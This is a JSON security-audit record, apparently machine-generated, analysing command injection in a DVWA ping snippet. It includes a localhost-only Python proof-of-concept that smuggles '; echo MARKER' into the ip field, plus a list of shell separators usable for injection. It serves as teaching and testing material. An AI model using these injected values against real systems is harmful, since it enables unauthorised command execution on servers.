@@ -1,0 +1,150 @@
+{
+  "schema_version": "wp2-output-v1",
+  "sample_id": "CMD-001",
+  "input_version": "v2",
+  "prompt_version": "final",
+  "analysis_stage": "parent",
+  "received_packet_ids": [
+    "CMD-001"
+  ],
+  "prediction": "存在候选",
+  "verdict": "待验证",
+  "confidence": {
+    "level": "high",
+    "reason": "片段内静态证据链完整：行4 将 $_REQUEST['ip'] 直接赋给 $target，片段内没有任何校验、白名单或 escapeshellarg；行6 按 php_uname('s') 选择系统分支；行8 与行12 都把 $target 以字符串拼接方式传入 shell_exec；行15 把命令输出拼入 $html 并交外围渲染。未发现分隔符过滤或参数边界防护。high 仅表示静态证据完整，不代表运行成功或配置可用。"
+  },
+  "findings": [
+    {
+      "finding_id": "CMD-001-CMDI-01",
+      "vulnerability_type": "命令注入",
+      "locations": [
+        {
+          "fragment_id": "CMD-001",
+          "line_start": 2,
+          "line_end": 2,
+          "quote": "$_POST[ 'Submit' ]"
+        },
+        {
+          "fragment_id": "CMD-001",
+          "line_start": 4,
+          "line_end": 4,
+          "quote": "$target = $_REQUEST[ 'ip' ];"
+        },
+        {
+          "fragment_id": "CMD-001",
+          "line_start": 6,
+          "line_end": 6,
+          "quote": "stristr( php_uname( 's' ), 'Windows NT' )"
+        },
+        {
+          "fragment_id": "CMD-001",
+          "line_start": 8,
+          "line_end": 8,
+          "quote": "shell_exec( 'ping"
+        },
+        {
+          "fragment_id": "CMD-001",
+          "line_start": 12,
+          "line_end": 12,
+          "quote": "-c 4 ' . $target"
+        },
+        {
+          "fragment_id": "CMD-001",
+          "line_start": 15,
+          "line_end": 15,
+          "quote": "\"<pre>{$cmd}</pre>\""
+        }
+      ],
+      "data_flow": [
+        "外围处理器启动登录会话，按配置包含本片段，并把片段产生的 $html 插入 page['body']，最后由 dvwaHtmlEcho 输出（外围源码未提供，按样本说明记录）。",
+        "行2：isset($_POST['Submit']) 为真时进入处理块，说明存在 POST 提交动作（Submit 为正常提交按钮名）。",
+        "行4：从 $_REQUEST['ip'] 读取 ip，可来自 POST、GET 或 Cookie 请求数据，未做 trim、类型判断、filter_var 或转义，直接赋给 $target。",
+        "行6：php_uname('s') 匹配 'Windows NT' 时走 Windows 分支，否则走 *nix 分支。",
+        "行8/行12：把 $target 直接拼接进 shell_exec('ping ...' ) 的命令字符串，没有引号包裹、escapeshellarg 或命令白名单，shell 语义保留分隔符。",
+        "行15：shell_exec 的返回输出 $cmd 拼入 \"<pre>{$cmd}</pre>\"，进入 $html，再经外围 page['body'] 与 dvwaHtmlEcho 返回浏览器。",
+        "观察点：响应 <pre> 中是否出现由 shell 解释产生的额外回显行（例如 echo 的标记），并与仅含正常 ping 统计的对照响应比较。"
+      ],
+      "principle": "shell_exec 会把参数交给系统 shell 解释（*nix 通常为 /bin/sh，Windows 为 cmd.exe）。由于 $target 未经转义地拼接到命令字符串末尾，*nix 分支可用 ;、&、&&、|、||、反引号、$() 等分隔符追加命令；Windows 分支可用 &、&&、|、|| 等追加命令。片段内不存在黑名单、白名单、数值校验或安全无 shell 调用，因此用户控制的 ip 值可以改变实际执行的命令集合，而不仅是 ping 的参数。",
+      "impact": "在 shell_exec 可用的部署中，已登录用户可让 Web 服务器进程以自身操作系统权限执行任意命令，导致数据读取、文件篡改、进一步横向移动等后果；教学验证只需无害回显标记，不应读取系统敏感文件或建立反向连接。实际影响取决于进程权限、PHP 配置及靶场隔离条件。",
+      "preconditions": [
+        "请求经外围处理器进入本片段，且已建立有效登录会话（片段外逻辑，未提供，需补证）。",
+        "请求方法为 POST 且包含 Submit 参数，否则行2 条件不成立，不进入处理逻辑。",
+        "ip 参数通过 $_REQUEST 可读取；PHP request_order/variables_order 配置决定 GET/POST/Cookie 的取值顺序，本片段未限定来源。",
+        "PHP 未通过 disable_functions 禁用 shell_exec，且 shell 可被调用；该配置未知，需在运行环境补证。",
+        "目标系统存在 ping（缺失只影响正常 ping 输出，不必然阻止分隔符后的 echo 命令被执行）。",
+        "当前部署/难度配置在包含本片段前后没有额外的 WAF、代理或应用层过滤；片段本身未见任何过滤。"
+      ],
+      "counterexamples": [
+        "若 php.ini 的 disable_functions 包含 shell_exec，则调用会失败或产生警告，命令不执行；这属于环境状态记录，不能据此把代码判为安全。",
+        "若部署在包含本片段之前的上层加入白名单（如仅允许 FILTER_VALIDATE_IP 通过的 IPv4 字面量），或对 ip 使用 escapeshellarg/escapeshellcmd，则本路径的可利用性被阻断；但提供的片段中不存在这些代码。",
+        "若请求未携带有效会话或缺少 Submit 参数，行2 不成立，无法到达行8/行12；这是认证与入口条件，不是代码防护。",
+        "若实际执行路径属于其他难度文件（例如已加入过滤的实现），不能把本片段的结论外推到该文件；本片段的行文只对应所给代码。",
+        "若 shell 被替换为不解释元字符的固定参数调用（例如无 shell 的参数数组执行），分隔符不再生效；所给代码使用 shell_exec 字符串形式，不属于该情形。"
+      ],
+      "poc": {
+        "status": "需人工适配",
+        "language": "python",
+        "code": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"CMD-001 command-injection verification draft (harmless echo marker, localhost only).\n\nExample:\n  python cmd001_poc.py --base-url http://127.0.0.1/dvwa/vulnerabilities/exec/ --cookie-file ./local_cookie.txt --target 127.0.0.1 --os linux\n\"\"\"\n\nimport argparse\nimport sys\nimport urllib.error\nimport urllib.parse\nimport urllib.request\n\nALLOWED_HOSTS = ('localhost', '127.0.0.1', '::1')\n\n\nclass NoRedirect(urllib.request.HTTPRedirectHandler):\n    def redirect_request(self, req, fp, code, msg, headers, newurl):\n        return None\n\n\ndef check_base_url(url):\n    parts = urllib.parse.urlsplit(url)\n    if parts.scheme not in ('http', 'https'):\n        raise SystemExit('refuse: only http/https allowed, got %r' % (parts.scheme,))\n    host = (parts.hostname or '').lower()\n    if host not in ALLOWED_HOSTS:\n        raise SystemExit('refuse: only localhost/127.0.0.1/::1 allowed, got %r' % (host,))\n\n\ndef read_cookie(path):\n    if not path:\n        return None\n    with open(path, 'r', encoding='utf-8') as handle:\n        value = handle.read().strip()\n    return value or None\n\n\ndef send(opener, url, payload, cookie, timeout):\n    data = urllib.parse.urlencode(payload).encode('utf-8')\n    request = urllib.request.Request(url, data=data, method='POST')\n    request.add_header('Content-Type', 'application/x-www-form-urlencoded')\n    request.add_header('User-Agent', 'wp4-cmd001-poc/1.0')\n    if cookie:\n        request.add_header('Cookie', cookie)\n    try:\n        with opener.open(request, timeout=timeout) as response:\n            return response.status, response.read().decode('utf-8', 'replace')\n    except urllib.error.HTTPError as exc:\n        return exc.code, exc.read().decode('utf-8', 'replace')\n\n\ndef main():\n    parser = argparse.ArgumentParser(description='CMD-001 local command-injection check (harmless marker)')\n    parser.add_argument('--base-url', required=True)\n    parser.add_argument('--cookie-file', default=None)\n    parser.add_argument('--target', default='127.0.0.1')\n    parser.add_argument('--os', dest='os_name', choices=('linux', 'windows'), default='linux')\n    parser.add_argument('--marker', default='WP2_CMD001_MARKER')\n    parser.add_argument('--timeout', type=float, default=10.0)\n    args = parser.parse_args()\n\n    check_base_url(args.base_url)\n    cookie = read_cookie(args.cookie_file)\n    opener = urllib.request.build_opener(NoRedirect)\n\n    if args.os_name == 'windows':\n        injected = '%s & echo %s' % (args.target, args.marker)\n    else:\n        injected = '%s; echo %s' % (args.target, args.marker)\n\n    control = {'Submit': 'Submit', 'ip': args.target}\n    test = {'Submit': 'Submit', 'ip': injected}\n\n    try:\n        control_status, control_body = send(opener, args.base_url, control, cookie, args.timeout)\n        test_status, test_body = send(opener, args.base_url, test, cookie, args.timeout)\n    except urllib.error.URLError as exc:\n        raise SystemExit('network/connection error (not verified): %s' % (exc,))\n    except OSError as exc:\n        raise SystemExit('socket/timeout error (not verified): %s' % (exc,))\n\n    control_hit = args.marker in control_body\n    test_hit = args.marker in test_body\n\n    print('control request: HTTP %s, marker=%s' % (control_status, control_hit))\n    print('test request:    HTTP %s, marker=%s' % (test_status, test_hit))\n\n    if control_status in (301, 302, 303, 307, 308) or test_status in (301, 302, 303, 307, 308):\n        print('redirect observed: session or URL likely wrong, fix login/URL before judging')\n\n    if test_hit and not control_hit:\n        print('observed extra marker in test response: static candidate has first-level observation, confirm manually')\n    elif test_hit and control_hit:\n        print('marker also in control response: not evidence of command interpretation')\n    else:\n        print('no marker observed: no evidence from this run; do not conclude safe either')\n\n    return 0\n\n\nif __name__ == '__main__':\n    sys.exit(main())\n",
+        "artifact_path": null,
+        "dependencies": [
+          "Python 3.8+（仅标准库：argparse、sys、urllib）",
+          "本地授权 DVWA 实例，且所审计的 exec/命令注入模块确实包含本片段对应的实现",
+          "有效 DVWA 登录会话的原始 Cookie 头，经本地文件提供，不写入版本库或运行输出"
+        ],
+        "parameters": [
+          "--base-url：靶场入口 URL，必须为 http/https 且主机为 localhost、127.0.0.1 或 ::1（脚本内强制校验）",
+          "--cookie-file：保存原始 Cookie 头（如 PHPSESSID=...）的本地文件路径；不含则可匿名尝试，但通常会被重定向到登录页",
+          "--target：被 ping 的目标，默认 127.0.0.1，仅使用本地回环地址",
+          "--os：linux 或 windows，决定使用 ';' 还是 '&' 分隔符，必须与实际部署分支一致",
+          "--marker：无害回显标记，默认 WP2_CMD001_MARKER",
+          "--timeout：HTTP 请求超时秒数，默认 10"
+        ],
+        "steps": [
+          "确认本地靶场已登录并进入包含本片段的命令注入页面，记录实际 URL、PHP 版本、操作系统与难度配置；确认 shell_exec 未被 disable_functions 禁用。",
+          "用已登录浏览器取得会话 Cookie，把原始 Cookie 头保存到本地文件（例如 ./local_cookie.txt）；不要提交到版本库，也不要打印到输出。",
+          "先发对照请求：python cmd001_poc.py --base-url http://127.0.0.1/dvwa/vulnerabilities/exec/ --cookie-file ./local_cookie.txt --target 127.0.0.1 --os linux，确认响应只含正常 ping 输出且不含标记。",
+          "再运行同一脚本的测试请求（脚本自动把 ip 设为 '127.0.0.1; echo WP2_CMD001_MARKER'；Windows 部署改用 --os windows，得到 '127.0.0.1 & echo WP2_CMD001_MARKER'）。",
+          "观察响应 <pre> 区域，区分标记是作为独立输出行出现，还是仅回显了输入字符串；保存请求、响应、时间戳与截图给工作包4。",
+          "若返回 301/302 跳转或登录页，先修复会话、URL 与 CSRF/难度条件，再重试；不要通过放宽主机限制或改用公网目标绕过。"
+        ],
+        "expected_observation": "对照请求只出现 ping 的正常统计输出（例如 4 个回包），不含 WP2_CMD001_MARKER；测试请求的 <pre> 中除 ping 统计外，另出现一行由 echo 产生的 WP2_CMD001_MARKER，且该行不是输入字符串原样回显（输入中出现的是 '; echo ...' 组合，若仅整段回显输入则不能视为命令执行）。",
+        "success_criteria": "在测试响应中观察到 WP2_CMD001_MARKER 作为独立输出行出现在命令输出区域，而相同会话、相同 URL 与相同参数下的对照请求不出现该标记；同时保留完整请求记录、原始响应与时间戳供工作包3/4核验。仅 HTTP 200、仅响应包含输入字符串或仅脚本退出码 0 均不构成成功条件。",
+        "limitations": [
+          "草案未运行（execution_status=未运行），所有关于行为的描述均为静态推断。",
+          "需要人工提供有效 DVWA 会话与正确模块 URL；脚本无法自行登录或猜测表单字段。",
+          "shell_exec 是否可用、ping 是否存在、PHP/OS 版本与难度配置均未知；禁用 shell_exec 时即使脚本正常收到 200 也看不到标记。",
+          "marker 出现在响应中仍需排除输入回显与页面其它内容造成的假阳性，必须依赖对照请求与输出位置判断。",
+          "Windows 与 Linux 必须分别测试，不能把 Linux 的 ';' 语义套用于 Windows 分支。"
+        ],
+        "execution_status": "未运行"
+      }
+    }
+  ],
+  "exclusion_evidence": [],
+  "missing_context": [
+    "context/ 下的外围处理器源码：登录会话建立、包含本片段的配置条件、$html 初始化与 dvwaPage.inc.php 渲染路径。",
+    "实际部署的 PHP 版本、php.ini 中 disable_functions/shell_exec 状态、shell 与 ping 可执行文件是否存在。",
+    "DVWA 难度配置与执行该片段的具体文件，是否存在低/中/高难度不同的前置过滤或 token 校验。",
+    "运行时认证状态（是否已登录、Cookie/PHPSESSID 与 CSRF token 状态）及请求参数的实际取值顺序（request_order）。",
+    "操作系统分支的实际归属（php_uname 输出）以及 web 服务器进程权限，用于评估影响范围。",
+    "line_maps/CMD-001.csv 的映射关系，用于确认片段局部行号到标准化样本文件行号的对应。"
+  ],
+  "risk_notes": [
+    "行15 把 shell_exec 的输出直接拼入 \"<pre>{$cmd}</pre>\"，若 ping 将可控主机名等内容回显到输出中，可能形成响应中的 HTML 注入/XSS；该风险与命令注入分开评估，需要另行验证转义情况。",
+    "片段对 ip 无长度、格式或来源限制，可被用于探测内网主机存活（ping 扫描），即使在命令注入被防护的配置下也存在滥用面。",
+    "教学环境之外使用同类载荷属于未授权行为；本审计仅支持本地授权靶场的无害回显验证。"
+  ],
+  "quality_notes": [
+    "使用 shell_exec 拼接字符串是过时且不安全的执行方式；推荐 filter_var($target, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4) 白名单校验，并改用无 shell 的参数数组执行（如 proc_open 数组形式）或至少 escapeshellarg。",
+    "片段未显式初始化 $html，依赖外围处理器预先赋值，片段不能独立部署，属于可维护性与上下文耦合问题。",
+    "行8 与行12 的命令字符串存在多余空格，说明命令拼接缺乏统一封装，易在不同分支产生不一致行为。"
+  ],
+  "limitations": [
+    "本次仅静态阅读 CMD-001 提示文件中的代码片段，未运行任何请求，也没有 access 日志、响应或截图等运行证据。",
+    "片段不能独立执行；外围处理器、登录会话、页面渲染与难度选择均未提供，无法确认实际可达的请求路径与参数顺序。",
+    "报告行号为所给代码块的 1 起始局部行号（行1 为 <?php），未与 normalized_samples/CMD-001.php 或 line_maps/CMD-001.csv 逐行核对。",
+    "POC 为需人工适配的草案：依赖本地 DVWA 会话与正确 URL，脚本只发送无害 echo 标记，未验证 shell_exec/ping 可用性。",
+    "结论只覆盖所给片段对应的实现；其他难度文件或经 WAF/代理部署的配置可能不同，不能外推。"
+  ],
+  "runtime_evidence": []
+}
